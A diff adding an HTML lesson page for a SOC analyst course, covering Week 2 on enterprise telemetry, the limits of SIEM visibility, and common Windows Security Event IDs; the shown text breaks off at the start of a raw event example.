@@ -1,0 +1,1220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SACS Academy | Week 2: Enterprise Telemetry & Log Sources</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0B1220;
+    --bg-panel:#101A2E;
+    --bg-card:#141F38;
+    --bg-inset:#0A1526;
+    --line:#22314F;
+    --line-soft:#1A2540;
+    --text:#E7ECF5;
+    --text-dim:#9FADC7;
+    --text-faint:#6C7999;
+    --amber:#E3A63E;
+    --amber-dim:#9C7530;
+    --teal:#3FC1B0;
+    --teal-dim:#20554D;
+    --red:#E2604F;
+    --red-dim:#5B2A24;
+    --green:#59C27C;
+    --green-dim:#254B33;
+    --blue:#5B8DEF;
+    --purple:#9B7FE8;
+    --radius:10px;
+    --maxw:920px;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  body{
+    margin:0;
+    background:var(--bg);
+    color:var(--text);
+    font-family:'Source Sans 3', -apple-system, Segoe UI, sans-serif;
+    font-size:17px;
+    line-height:1.65;
+    -webkit-font-smoothing:antialiased;
+  }
+  h1,h2,h3,h4{
+    font-family:'Space Grotesk', sans-serif;
+    font-weight:600;
+    color:#FFFFFF;
+    letter-spacing:-0.01em;
+  }
+  code, pre, .mono{
+    font-family:'JetBrains Mono', monospace;
+  }
+  a{color:var(--amber);}
+
+  /* ---------- Layout shell ---------- */
+  .shell{ display:flex; min-height:100vh; }
+  nav.toc{
+    width:280px;
+    flex-shrink:0;
+    background:var(--bg-panel);
+    border-right:1px solid var(--line);
+    position:sticky;
+    top:0;
+    height:100vh;
+    overflow-y:auto;
+    padding:28px 22px 40px;
+  }
+  nav.toc::-webkit-scrollbar{width:6px;}
+  nav.toc::-webkit-scrollbar-thumb{background:var(--line);border-radius:4px;}
+  .toc-brand{
+    font-family:'Space Grotesk',sans-serif;
+    font-size:13px;
+    letter-spacing:0.14em;
+    color:var(--amber);
+    text-transform:uppercase;
+    margin-bottom:4px;
+  }
+  .toc-week{
+    font-size:20px;
+    font-weight:700;
+    color:#fff;
+    margin-bottom:24px;
+    line-height:1.3;
+  }
+  .toc-list{list-style:none;margin:0;padding:0;}
+  .toc-list a{
+    display:block;
+    color:var(--text-dim);
+    text-decoration:none;
+    font-size:14.5px;
+    padding:7px 10px;
+    border-radius:7px;
+    margin-bottom:2px;
+    transition:background .15s, color .15s;
+    border-left:2px solid transparent;
+  }
+  .toc-list a:hover{background:var(--bg-card); color:var(--text);}
+  .toc-list a.active{ color:var(--amber); background:var(--bg-card); border-left:2px solid var(--amber); }
+  .toc-list .sub{padding-left:22px; font-size:13.5px;}
+  .toc-progress{
+    margin-top:28px;
+    padding-top:18px;
+    border-top:1px solid var(--line);
+    font-size:12.5px;
+    color:var(--text-faint);
+  }
+
+  main{ flex:1; min-width:0; }
+  .content-wrap{
+    max-width:var(--maxw);
+    margin:0 auto;
+    padding:0 40px 120px;
+  }
+
+  /* ---------- Hero ---------- */
+  .hero{
+    padding:64px 40px 48px;
+    background:
+      radial-gradient(ellipse at top right, rgba(227,166,62,0.10), transparent 55%),
+      radial-gradient(ellipse at bottom left, rgba(63,193,176,0.08), transparent 50%);
+    border-bottom:1px solid var(--line);
+  }
+  .hero-inner{max-width:var(--maxw); margin:0 auto;}
+  .eyebrow{
+    display:inline-flex; align-items:center; gap:8px;
+    font-family:'JetBrains Mono',monospace;
+    font-size:12.5px;
+    color:var(--amber);
+    letter-spacing:0.08em;
+    text-transform:uppercase;
+    background:rgba(227,166,62,0.10);
+    border:1px solid rgba(227,166,62,0.35);
+    padding:5px 12px;
+    border-radius:100px;
+    margin-bottom:20px;
+  }
+  .hero h1{
+    font-size:40px;
+    line-height:1.15;
+    margin:0 0 14px;
+  }
+  .hero .accent{color:var(--amber);}
+  .hero-sub{
+    font-size:18.5px;
+    color:var(--text-dim);
+    max-width:680px;
+    margin:0 0 28px;
+  }
+  .hero-meta{
+    display:flex; flex-wrap:wrap; gap:14px;
+  }
+  .meta-pill{
+    display:flex; align-items:center; gap:8px;
+    background:var(--bg-card);
+    border:1px solid var(--line);
+    padding:8px 14px;
+    border-radius:100px;
+    font-size:13.5px;
+    color:var(--text-dim);
+  }
+  .meta-pill b{color:var(--text); font-weight:600;}
+
+  /* ---------- Sections ---------- */
+  section{padding:56px 0; border-bottom:1px solid var(--line-soft);}
+  section:last-child{border-bottom:none;}
+  .section-tag{
+    font-family:'JetBrains Mono',monospace;
+    font-size:12.5px;
+    color:var(--teal);
+    letter-spacing:0.1em;
+    text-transform:uppercase;
+    margin-bottom:10px;
+  }
+  h2.section-title{ font-size:30px; margin:0 0 6px; }
+  .section-dek{ color:var(--text-dim); font-size:17px; margin:0 0 32px; max-width:680px;}
+  h3{font-size:22px; margin:36px 0 12px;}
+  h4{font-size:18px; margin:26px 0 10px; color:var(--text);}
+  p{margin:0 0 18px; color:#D6DEEE;}
+  ul,ol{margin:0 0 20px; padding-left:22px; color:#D6DEEE;}
+  li{margin-bottom:8px;}
+  strong{color:#fff; font-weight:600;}
+
+  /* ---------- Callouts ---------- */
+  .callout{
+    border-radius:var(--radius);
+    border:1px solid var(--line);
+    background:var(--bg-card);
+    padding:20px 22px;
+    margin:22px 0;
+  }
+  .callout-title{
+    display:flex; align-items:center; gap:10px;
+    font-family:'Space Grotesk',sans-serif;
+    font-weight:600; font-size:15px;
+    margin-bottom:8px;
+  }
+  .callout.story{ border-left:3px solid var(--blue); }
+  .callout.story .callout-title{ color:var(--blue); }
+  .callout.mentor{ border-left:3px solid var(--amber); background:rgba(227,166,62,0.06);}
+  .callout.mentor .callout-title{ color:var(--amber); }
+  .callout.warning{ border-left:3px solid var(--red); background:rgba(226,96,79,0.06);}
+  .callout.warning .callout-title{ color:var(--red); }
+  .callout.pitfall{ border-left:3px solid var(--purple); background:rgba(155,127,232,0.06);}
+  .callout.pitfall .callout-title{ color:var(--purple); }
+  .icon{width:18px;height:18px;flex-shrink:0;}
+
+  /* ---------- Terminal / log blocks ---------- */
+  .term{
+    background:var(--bg-inset);
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    overflow:hidden;
+    margin:20px 0;
+  }
+  .term-bar{
+    display:flex; align-items:center; gap:8px;
+    padding:10px 14px;
+    background:#0D1729;
+    border-bottom:1px solid var(--line);
+  }
+  .term-dot{width:10px;height:10px;border-radius:50%;}
+  .term-label{
+    margin-left:8px;
+    font-family:'JetBrains Mono',monospace;
+    font-size:12px;
+    color:var(--text-faint);
+  }
+  .term-body{
+    padding:16px 18px;
+    font-family:'JetBrains Mono',monospace;
+    font-size:13.5px;
+    line-height:1.7;
+    overflow-x:auto;
+    color:#C9D6EC;
+    white-space:pre;
+  }
+  .term-body .f1{color:var(--teal);}
+  .term-body .f2{color:var(--amber);}
+  .term-body .f3{color:var(--red);}
+  .term-body .f4{color:var(--green);}
+  .term-body .dim{color:var(--text-faint);}
+
+  /* ---------- Tables ---------- */
+  table{width:100%; border-collapse:collapse; margin:20px 0; font-size:15px;}
+  th{
+    text-align:left; background:var(--bg-panel); color:var(--text-dim);
+    font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:13px;
+    text-transform:uppercase; letter-spacing:0.04em;
+    padding:12px 14px; border-bottom:1px solid var(--line);
+  }
+  td{padding:12px 14px; border-bottom:1px solid var(--line-soft); color:#D6DEEE; vertical-align:top;}
+  tr:last-child td{border-bottom:none;}
+  td.tag{font-family:'JetBrains Mono',monospace; font-size:12.5px; white-space:nowrap;}
+
+  /* ---------- Badges ---------- */
+  .badge{
+    display:inline-block; padding:3px 10px; border-radius:5px;
+    font-family:'JetBrains Mono',monospace; font-size:12px; font-weight:600;
+    letter-spacing:0.02em;
+  }
+  .b-crit{background:var(--red-dim); color:#FFB4A8;}
+  .b-high{background:#5B2A24; color:#F5B48A;}
+  .b-med{background:var(--amber-dim); color:#FFDDA0;}
+  .b-low{background:var(--teal-dim); color:#A8ECE0;}
+  .b-info{background:#233355; color:#AFC4F5;}
+  .b-true{background:var(--green-dim); color:#B6EFC7;}
+  .b-false{background:#3A2540; color:#E3B8F0;}
+
+  /* ---------- Diagram frames ---------- */
+  .diagram{
+    background:var(--bg-card);
+    border:1px solid var(--line);
+    border-radius:var(--radius);
+    padding:28px;
+    margin:26px 0;
+    overflow-x:auto;
+  }
+  .diagram-caption{
+    text-align:center; font-size:13.5px; color:var(--text-faint); margin-top:14px;
+    font-family:'JetBrains Mono',monospace;
+  }
+
+  /* ---------- Tabs (for triage examples) ---------- */
+  .tabs{margin:22px 0;}
+  .tab-buttons{display:flex; gap:4px; flex-wrap:wrap; border-bottom:1px solid var(--line); margin-bottom:0;}
+  .tab-btn{
+    background:transparent; border:none; color:var(--text-dim);
+    font-family:'Space Grotesk',sans-serif; font-size:14px; font-weight:500;
+    padding:10px 18px; cursor:pointer; border-bottom:2px solid transparent;
+    transition:color .15s;
+  }
+  .tab-btn:hover{color:var(--text);}
+  .tab-btn.active{color:var(--amber); border-bottom:2px solid var(--amber);}
+  .tab-panel{display:none; padding-top:18px;}
+  .tab-panel.active{display:block;}
+
+  /* ---------- Accordion (glossary / deep dives) ---------- */
+  .accordion-item{ border:1px solid var(--line); border-radius:var(--radius); margin-bottom:10px; overflow:hidden; background:var(--bg-card);}
+  .accordion-head{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:15px 18px; cursor:pointer; user-select:none;
+  }
+  .accordion-head span.term{font-weight:600; color:#fff; font-family:'Space Grotesk',sans-serif;}
+  .accordion-head .chev{transition:transform .2s; color:var(--text-faint);}
+  .accordion-item.open .chev{transform:rotate(180deg);}
+  .accordion-body{ max-height:0; overflow:hidden; transition:max-height .25s ease; padding:0 18px;}
+  .accordion-item.open .accordion-body{ max-height:600px; padding-bottom:16px;}
+
+  /* ---------- Checklist ---------- */
+  .checklist{list-style:none; padding:0; margin:20px 0;}
+  .checklist li{
+    display:flex; gap:12px; align-items:flex-start;
+    padding:10px 0; border-bottom:1px solid var(--line-soft);
+  }
+  .checklist li:last-child{border-bottom:none;}
+  .checklist .box{
+    width:18px;height:18px;flex-shrink:0;margin-top:2px;
+    border:2px solid var(--teal); border-radius:4px;
+  }
+
+  /* ---------- Numbered flow ---------- */
+  .flow-step{
+    display:flex; gap:18px; margin-bottom:0; position:relative; padding-bottom:28px;
+  }
+  .flow-step:last-child{padding-bottom:0;}
+  .flow-step::before{
+    content:''; position:absolute; left:19px; top:42px; bottom:0; width:2px;
+    background:var(--line);
+  }
+  .flow-step:last-child::before{display:none;}
+  .flow-num{
+    width:40px;height:40px;flex-shrink:0;border-radius:50%;
+    background:var(--bg-panel); border:2px solid var(--amber);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Space Grotesk',sans-serif; font-weight:700; color:var(--amber);
+    font-size:16px; z-index:1;
+  }
+  .flow-content h4{margin:2px 0 6px;}
+  .flow-content p{margin-bottom:4px;}
+
+  /* ---------- Deliverable / Checkpoint blocks ---------- */
+  .deliverable-box{
+    background:linear-gradient(135deg, rgba(63,193,176,0.10), rgba(63,193,176,0.02));
+    border:1px solid var(--teal-dim);
+    border-radius:var(--radius);
+    padding:26px;
+    margin:24px 0;
+  }
+  .deliverable-box .section-tag{color:var(--teal);}
+  .checkpoint-box{
+    background:linear-gradient(135deg, rgba(227,166,62,0.10), rgba(227,166,62,0.02));
+    border:1px solid var(--amber-dim);
+    border-radius:var(--radius);
+    padding:26px;
+    margin:24px 0;
+  }
+  .checkpoint-box .section-tag{color:var(--amber);}
+
+  /* ---------- Footer nav ---------- */
+  .weeknav{
+    display:flex; justify-content:space-between; align-items:center;
+    padding:36px 0 0;
+  }
+  .weeknav a{
+    text-decoration:none; color:var(--text-dim); font-size:14.5px;
+    display:flex; align-items:center; gap:8px;
+  }
+  .weeknav a:hover{color:var(--amber);}
+
+  /* ---------- Interactive quiz items ---------- */
+  .live-tag{
+    display:inline-block; vertical-align:middle;
+    font-family:'JetBrains Mono',monospace; font-size:11px; font-weight:500;
+    color:var(--teal); background:rgba(63,193,176,0.10);
+    border:1px solid var(--teal-dim); border-radius:100px;
+    padding:3px 10px; margin-left:10px; letter-spacing:0.03em;
+  }
+  .quiz-item{
+    background:var(--bg-card); border:1px solid var(--line); border-radius:var(--radius);
+    padding:20px 22px; margin:16px 0;
+  }
+  .quiz-q{ font-weight:600; color:#fff; margin-bottom:14px; font-size:15.5px; }
+  .quiz-options{ display:flex; flex-wrap:wrap; gap:10px; }
+  .quiz-opt{
+    background:var(--bg-inset); border:1px solid var(--line); color:var(--text-dim);
+    font-family:'Space Grotesk',sans-serif; font-size:14px; font-weight:500;
+    padding:9px 18px; border-radius:8px; cursor:pointer; transition:all .15s;
+  }
+  .quiz-opt:hover{ border-color:var(--amber); color:#fff; }
+  .quiz-item.answered .quiz-opt{ cursor:default; }
+  .quiz-item.answered .quiz-opt:hover{ border-color:var(--line); color:var(--text-dim); }
+  .quiz-opt.chosen-correct{ background:var(--green-dim); border-color:var(--green); color:#B6EFC7; }
+  .quiz-opt.chosen-wrong{ background:var(--red-dim); border-color:var(--red); color:#FFB4A8; }
+  .quiz-opt.reveal-correct{ border-color:var(--green); color:#B6EFC7; }
+  .quiz-feedback{
+    display:none; margin-top:16px; padding-top:16px; border-top:1px dashed var(--line);
+  }
+  .quiz-item.answered .quiz-feedback{ display:block; }
+  .quiz-feedback p{ margin-bottom:0; }
+
+  /* ---------- Drag and drop matching ---------- */
+  .match-wrap{
+    display:grid; grid-template-columns:1fr 1fr; gap:28px;
+    background:var(--bg-card); border:1px solid var(--line); border-radius:var(--radius);
+    padding:26px; margin:22px 0;
+  }
+  .match-col-title{
+    font-family:'JetBrains Mono',monospace; font-size:12px; letter-spacing:0.08em;
+    text-transform:uppercase; color:var(--text-faint); margin-bottom:14px;
+  }
+  .drag-chip{
+    background:var(--bg-inset); border:1.5px solid var(--amber-dim); color:#fff;
+    font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:14.5px;
+    padding:12px 16px; border-radius:8px; margin-bottom:12px; cursor:grab;
+    transition:opacity .15s, transform .15s;
+  }
+  .drag-chip:active{ cursor:grabbing; }
+  .drag-chip.placed{ opacity:0.3; cursor:not-allowed; }
+  .drop-zone{
+    background:var(--bg-inset); border:1.5px dashed var(--line); border-radius:8px;
+    padding:14px 16px; margin-bottom:12px; min-height:64px;
+    font-size:13.5px; color:var(--text-dim);
+    display:flex; flex-direction:column; justify-content:center;
+    transition:border-color .15s, background .15s;
+  }
+  .drop-zone.dragover{ border-color:var(--teal); background:rgba(63,193,176,0.08); }
+  .drop-zone.filled{ border-style:solid; border-color:var(--teal); }
+  .drop-zone.filled.wrong{ border-color:var(--red); }
+  .drop-zone .dz-label{ font-family:'Space Grotesk',sans-serif; font-weight:700; color:var(--teal); font-size:13.5px; margin-bottom:4px; }
+  .drop-zone .dz-text{ color:#D6DEEE; font-size:13.5px; line-height:1.5; }
+  .drop-zone.filled .dz-label{ font-family:'JetBrains Mono',monospace; }
+  .drop-zone.wrong .dz-label{ color:var(--red); }
+  .match-reset{
+    margin-top:6px; background:transparent; border:1px solid var(--line); color:var(--text-dim);
+    font-family:'Space Grotesk',sans-serif; font-size:13px; padding:7px 14px; border-radius:7px; cursor:pointer;
+  }
+  .match-reset:hover{ border-color:var(--amber); color:#fff; }
+  .match-status{ font-size:13.5px; color:var(--text-faint); margin-top:10px; grid-column:1/-1; }
+
+  /* ---------- "Make the call" interactive widget ---------- */
+  .callwidget{
+    background:var(--bg-inset); border:1px solid var(--line); border-radius:var(--radius);
+    padding:18px 20px; margin:18px 0;
+  }
+  .callwidget-title{ font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--amber); letter-spacing:0.06em; text-transform:uppercase; margin-bottom:12px;}
+  .call-row{ display:flex; align-items:center; gap:14px; margin-bottom:12px; flex-wrap:wrap; }
+  .call-row .call-label{ width:110px; flex-shrink:0; font-size:13.5px; color:var(--text-dim); font-weight:600; }
+  .call-pill{
+    background:transparent; border:1px solid var(--line); color:var(--text-dim);
+    font-family:'JetBrains Mono',monospace; font-size:12.5px; padding:6px 13px;
+    border-radius:100px; cursor:pointer; transition:all .15s;
+  }
+  .call-pill:hover{ border-color:var(--amber); color:#fff; }
+  .call-pill.selected{ background:var(--amber); border-color:var(--amber); color:#1A1200; font-weight:600; }
+  .reveal-btn{
+    background:var(--teal); color:#08201C; border:none; font-family:'Space Grotesk',sans-serif;
+    font-weight:700; font-size:14px; padding:10px 20px; border-radius:8px; cursor:pointer; margin-top:6px;
+  }
+  .reveal-btn:hover{ background:#57D4C3; }
+  .reveal-btn:disabled{ opacity:0.4; cursor:not-allowed; }
+  .expert-analysis{ display:none; margin-top:18px; padding-top:18px; border-top:1px dashed var(--line); }
+  .expert-analysis.shown{ display:block; }
+  .match-banner{
+    font-size:13.5px; padding:9px 14px; border-radius:7px; margin-bottom:14px; display:none;
+  }
+  .match-banner.shown{ display:block; }
+  .match-banner.full-match{ background:var(--green-dim); color:#B6EFC7; }
+  .match-banner.partial-match{ background:var(--amber-dim); color:#FFDDA0; }
+
+  @media (max-width: 620px){
+    .match-wrap{ grid-template-columns:1fr; }
+  }
+
+  ::selection{ background:rgba(227,166,62,0.35); }
+
+  @media (max-width: 880px){
+    nav.toc{display:none;}
+    .content-wrap{padding:0 20px 80px;}
+    .hero{padding:44px 20px 36px;}
+    .hero h1{font-size:30px;}
+  }
+
+
+  @media (max-width: 880px){
+    .match-wrap{grid-template-columns:1fr;}
+  }
+
+  .trace-step{
+    background:var(--bg-card); border:1px solid var(--line); border-radius:var(--radius);
+    padding:20px 22px; margin-bottom:14px;
+  }
+  .trace-step-head{ display:flex; align-items:center; gap:14px; }
+  .trace-num{
+    width:34px;height:34px;flex-shrink:0;border-radius:50%;
+    background:var(--bg-panel); border:2px solid var(--purple);
+    display:flex; align-items:center; justify-content:center;
+    font-family:'Space Grotesk',sans-serif; font-weight:700; color:var(--purple); font-size:14px;
+  }
+  .trace-step-title{ font-weight:600; color:#fff; font-size:15.5px; flex:1; }
+  .trace-toggle-btn{
+    background:transparent; border:1px solid var(--line); color:var(--text-dim);
+    font-family:'Space Grotesk',sans-serif; font-size:13px; padding:7px 14px;
+    border-radius:7px; cursor:pointer; flex-shrink:0;
+  }
+  .trace-toggle-btn:hover{ border-color:var(--purple); color:#fff; }
+  .trace-body{ display:none; margin-top:16px; padding-top:16px; border-top:1px dashed var(--line); }
+  .trace-body.shown{ display:block; }
+
+  .msq{
+    background:var(--bg-card); border:1px solid var(--line); border-radius:var(--radius);
+    padding:20px 22px; margin:18px 0;
+  }
+  .msq-q{ font-weight:600; color:#fff; margin-bottom:14px; font-size:15px; }
+  .msq-opt{
+    display:flex; align-items:center; gap:10px;
+    background:var(--bg-inset); border:1px solid var(--line); color:var(--text-dim);
+    font-family:'Source Sans 3',sans-serif; font-size:14.5px;
+    padding:10px 14px; border-radius:8px; cursor:pointer; margin-bottom:8px; transition:all .15s;
+  }
+  .msq-opt:hover{ border-color:var(--teal); }
+  .msq-opt .msq-box{ width:16px;height:16px;border:2px solid var(--teal); border-radius:4px; flex-shrink:0; }
+  .msq-opt.picked .msq-box{ background:var(--teal); }
+  .msq-opt.picked{ color:#fff; }
+  .msq-submit{
+    background:var(--purple); color:#fff; border:none; font-family:'Space Grotesk',sans-serif;
+    font-weight:700; font-size:13.5px; padding:9px 18px; border-radius:8px; cursor:pointer; margin-top:6px;
+  }
+  .msq-submit:hover{ opacity:0.85; }
+  .msq-result{ display:none; margin-top:14px; padding:12px 14px; border-radius:8px; font-size:13.5px; }
+  .msq-result.shown{ display:block; }
+  .msq-result.good{ background:var(--green-dim); color:#B6EFC7; }
+  .msq-result.bad{ background:var(--amber-dim); color:#FFDDA0; }
+</style>
+</head>
+<body>
+<div class="shell">
+
+  <nav class="toc" id="toc">
+    <div class="toc-brand">SACS Academy | Phase I</div>
+    <div class="toc-week">Week 2: Enterprise Telemetry &amp; Log Sources</div>
+    <ul class="toc-list">
+      <li><a href="#intro">Why this week matters</a></li>
+      <li><a href="#objectives">Learning objectives</a></li>
+      <li><a href="#bigpicture">The visibility stack</a></li>
+      <li><a href="#windows">Windows Security logs</a></li>
+      <li><a href="#sysmon">Sysmon: seeing what Windows hides</a></li>
+      <li><a href="#powershell">PowerShell logging</a></li>
+      <li><a href="#linux">Linux: syslog, journald, auditd</a></li>
+      <li><a href="#network">Network protocol telemetry</a></li>
+      <li><a href="#identity">Authentication &amp; identity logs</a></li>
+      <li><a href="#perimeter">Firewall, proxy, VPN &amp; cloud audit</a></li>
+      <li><a href="#quality">Timestamps, fields &amp; data quality</a></li>
+      <li><a href="#trace">Hands-on: tracing an attack through logs</a></li>
+      <li><a href="#gaps">Visibility gap exercise</a></li>
+      <li><a href="#deliverable">This week's deliverable</a></li>
+      <li><a href="#checkpoint">Competency checkpoint</a></li>
+      <li><a href="#glossary">Glossary</a></li>
+      <li><a href="#further">Further reading</a></li>
+    </ul>
+    <div class="toc-progress">Phase I, Week 2 of 20<br>SOC Operations and Security Telemetry</div>
+  </nav>
+
+  <main>
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="eyebrow">Phase I, Week 2</div>
+        <h1>Enterprise Telemetry and <span class="accent">Log Sources</span></h1>
+        <p class="hero-sub">Week 1 taught you how to think about an alert. This week teaches you where an alert's raw material actually comes from, and why the honest answer to "can we see that?" is usually "it depends which log you're looking at."</p>
+        <div class="hero-meta">
+          <div class="meta-pill">Focus: where evidence actually lives</div>
+          <div class="meta-pill">Deliverable: telemetry map</div>
+          <div class="meta-pill">Infra: Windows VM + Linux VM built this week</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="content-wrap">
+
+      <section id="intro">
+        <div class="section-tag">Orientation</div>
+        <h2 class="section-title">The question that separates analysts who guess from analysts who know</h2>
+        <p class="section-dek">"Could we have seen that?" is one of the most common questions asked after any security incident, in any organisation, anywhere in the world. This week teaches you to answer it correctly, before an incident forces the question on you.</p>
+
+        <p>Here is a scenario that plays out constantly in real SOCs. An incident happens. Leadership asks: "did anyone log into that server that night?" A junior analyst says "let me check the SIEM," searches, finds nothing, and reports back: "no logins occurred." That answer is dangerously incomplete, and it might be flatly wrong. The correct answer requires knowing something the junior analyst never stopped to ask: was that server even sending its logs anywhere? Was the specific event type that would show a login actually being collected? Had retention already aged out the window in question? "I searched and found nothing" and "that evidence never existed" are two completely different findings, and confusing them has caused real organisations to give false reassurance to their own leadership, their regulators, and their customers.</p>
+
+        <div class="callout mentor">
+          <div class="callout-title"><svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l2.4 7.2H22l-6 4.6 2.3 7.2-6.3-4.6-6.3 4.6 2.3-7.2-6-4.6h7.6z"/></svg> A mentor's honest take</div>
+          <p style="margin-bottom:0;">A SIEM is often sold, and sometimes mentally treated by new analysts, as though it magically sees everything happening in an environment. It does not. A SIEM only ever knows about what somebody configured to be sent to it, in a format it was configured to understand, kept for as long as somebody decided to pay to store it. Every one of those is a human decision, made before you ever touched the alert. Understanding those decisions, and their limits, is the actual skill this week is building. Miss this, and you will spend your whole career trusting a tool that is only ever as complete as the humans who configured its inputs.</p>
+        </div>
+
+        <p>This week you will build the two virtual machines you will use for most of the rest of this programme: a Windows VM and a Linux VM. You will install Sysmon and enable PowerShell logging immediately, before generating any activity, for a reason that matters more than it sounds: telemetry only exists for what happened after logging was switched on. There is no way to retroactively recover visibility into something that already happened before you started watching. That single fact is why the very first thing every real SOC engagement does, whether it is a new client or a promotion into a new environment, is audit exactly what is currently being logged, before anything else.</p>
+      </section>
+
+      <section id="objectives">
+        <div class="section-tag">Objectives</div>
+        <h2 class="section-title">By the end of this week, you will be able to</h2>
+        <ul class="checklist">
+          <li><span class="box"></span><div>Explain what each major telemetry source actually captures, in plain language, and give a realistic example of what its raw output looks like.</div></li>
+          <li><span class="box"></span><div>Explain why native Windows Event Logs alone are usually insufficient for real investigation, and specifically what Sysmon adds that Windows does not provide by default.</div></li>
+          <li><span class="box"></span><div>Read and interpret raw log lines from Windows Security Events, Sysmon, PowerShell logging, Linux syslog, journald, and auditd.</div></li>
+          <li><span class="box"></span><div>Trace a single simulated action, from execution to network callback, through the specific log entries it would generate across multiple sources.</div></li>
+          <li><span class="box"></span><div>Identify a visibility gap: a scenario where an attacker's action would not be captured by the logging currently configured, and explain why.</div></li>
+          <li><span class="box"></span><div>Explain why timestamps, field naming, and normalisation are not boring housekeeping details, but frequent, real causes of investigations going wrong.</div></li>
+          <li><span class="box"></span><div>Produce a professional telemetry map for a lab environment: source, fields, retention considerations, and investigative use.</div></li>
+        </ul>
+      </section>
+
+      <section id="bigpicture">
+        <div class="section-tag">The Big Picture</div>
+        <h2 class="section-title">The visibility stack: five layers, one attacker trying to move through all of them unseen</h2>
+        <p class="section-dek">Before the individual log sources, you need the map they all sit on. Every layer below is a different vantage point on the same organisation, and an attacker who is skilled will try to minimise their footprint at every one of them.</p>
+
+        <div class="diagram">
+          <svg viewBox="0 0 820 380" width="100%" xmlns="http://www.w3.org/2000/svg" font-family="Space Grotesk, sans-serif">
+            <rect x="40" y="20" width="740" height="60" rx="8" fill="#152038" stroke="#5B8DEF"/>
+            <text x="60" y="45" fill="#AFC4F5" font-size="14" font-weight="700">IDENTITY</text>
+            <text x="60" y="64" fill="#8FA3D6" font-size="11.5">Who authenticated, as whom, from where. Active Directory, Azure AD/Entra, Okta.</text>
+
+            <rect x="40" y="90" width="740" height="60" rx="8" fill="#152A30" stroke="#3FC1B0"/>
+            <text x="60" y="115" fill="#A8ECE0" font-size="14" font-weight="700">ENDPOINT</text>
+            <text x="60" y="134" fill="#7FCFC0" font-size="11.5">What ran, what touched disk, what touched the registry. Sysmon, EDR, Windows/Linux native logs.</text>
+
+            <rect x="40" y="160" width="740" height="60" rx="8" fill="#1E1A30" stroke="#9B7FE8"/>
+            <text x="60" y="185" fill="#D6C6F5" font-size="14" font-weight="700">NETWORK</text>
+            <text x="60" y="204" fill="#B7A3D9" font-size="11.5">What talked to what, and to where outside. DNS, firewall, proxy, packet capture, Zeek/Suricata (Week 8&#8211;9).</text>
+
+            <rect x="40" y="230" width="740" height="60" rx="8" fill="#2A1613" stroke="#E2604F"/>
+            <text x="60" y="255" fill="#FFC4B8" font-size="14" font-weight="700">PERIMETER &amp; ACCESS</text>
+            <text x="60" y="274" fill="#E89184" font-size="11.5">How anything crossed the boundary. VPN, remote access gateways, cloud API calls.</text>
+
+            <rect x="40" y="300" width="740" height="60" rx="8" fill="#2A2313" stroke="#E3A63E"/>
+            <text x="60" y="325" fill="#FFDDA0" font-size="14" font-weight="700">APPLICATION &amp; CLOUD AUDIT</text>
+            <text x="60" y="344" fill="#E0BE84" font-size="11.5">What a specific system or SaaS platform recorded about its own use. CloudTrail, Azure sign-in logs, app logs.</text>
+          </svg>
+          <div class="diagram-caption">An attacker leaves some trace at almost every layer. Your job across this programme is learning to look at all five, not just the one your current tool happens to show you first.</div>
+        </div>
+
+        <p>Notice something important about this stack: <strong>no single layer tells the whole story on its own.</strong> Identity logs might show a successful login. Endpoint logs might show what that logged-in session then executed. Network logs might show where that execution then tried to communicate. A junior analyst who only ever checks one layer, usually whichever one their SIEM dashboard opens to by default, will consistently miss the parts of the story that live in the other four. This week walks through each layer in enough depth that you know exactly what evidence to expect from it, and just as importantly, what it will never be able to tell you.</p>
+      </section>
+
+      <section id="windows">
+        <div class="section-tag">Source 1</div>
+        <h2 class="section-title">Windows Security Event Log: the default, and its real limits</h2>
+        <p class="section-dek">Every Windows machine keeps a Security event log by default. It is a genuinely useful source, and it is also, on its own, nowhere near enough for real investigation. Understanding exactly why is the point of this section.</p>
+
+        <p>Windows organises what it logs using Event IDs, numeric codes that each mean a specific, fixed thing. You do not need to memorise all of them, but a working analyst needs immediate, reflexive recognition of the common ones, the way a doctor recognises common lab values without looking them up every time.</p>
+
+        <table>
+          <tr><th>Event ID</th><th>What it means</th><th>Why it matters</th></tr>
+          <tr><td class="tag">4624</td><td>An account successfully logged on</td><td>Your baseline "who got in" event. Pay close attention to the Logon Type field (covered in the Identity section below).</td></tr>
+          <tr><td class="tag">4625</td><td>An account failed to log on</td><td>Repeated 4625s from one source are the classic brute-force signature you saw in Week 1's alert queue.</td></tr>
+          <tr><td class="tag">4688</td><td>A new process was created</td><td>Extremely valuable, but only if command-line auditing is explicitly enabled. Off by default in many environments, which is a real, common visibility gap.</td></tr>
+          <tr><td class="tag">4720</td><td>A user account was created</td><td>New account creation is always worth understanding the context of, especially outside a scheduled onboarding process.</td></tr>
+          <tr><td class="tag">4728 / 4732</td><td>A member was added to a global / local security group</td><td>This is exactly what you triaged in Week 1's Domain Admins scenario.</td></tr>
+          <tr><td class="tag">4698</td><td>A scheduled task was created</td><td>One of the most common persistence mechanisms you will hunt for from Week 5 onward.</td></tr>
+          <tr><td class="tag">5140</td><td>A network share object was accessed</td><td>Useful for tracing lateral movement across file shares.</td></tr>
+          <tr><td class="tag">4776</td><td>The domain controller attempted to validate credentials (NTLM)</td><td>Useful for spotting NTLM authentication where Kerberos would be expected, itself sometimes a red flag.</td></tr>
+        </table>
+
+        <div class="term">
+          <div class="term-bar"><span class="term-dot" style="background:#E2604F"></span><span class="term-dot" style="background:#E3A63E"></span><span class="term-dot" style="background:#59C27C"></span><span class="term-label">raw Windows Security event, as you would see it in Event Viewer</span></div>
+          <div class="term-body">Log Name:      Security
+Source:        Microsoft-Windows-Security-Auditing
